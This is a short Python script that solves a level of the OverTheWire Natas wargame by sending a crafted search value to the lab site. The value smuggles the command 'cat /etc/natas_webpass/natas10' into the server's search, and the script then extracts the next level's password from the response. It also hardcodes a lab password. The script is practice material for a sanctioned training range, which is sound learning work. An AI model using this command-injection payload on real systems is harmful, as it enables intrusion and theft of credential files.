import requests
import re #regular expressions

username = "natas10"
password = "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv"

url = 'http://%s.natas.labs.overthewire.org' % username

data={"needle":". cat /etc/natas_webpass/natas10 #","submit":"Search"}

session = requests.Session() #Maintains a session
#response = session.get(url , auth=(username, password))
response = session.post(url , auth=(username, password),data=data)
content = response.text

#print (content)
print (re.findall("/etc/natas_webpass/natas10:(.*)",content)[0])
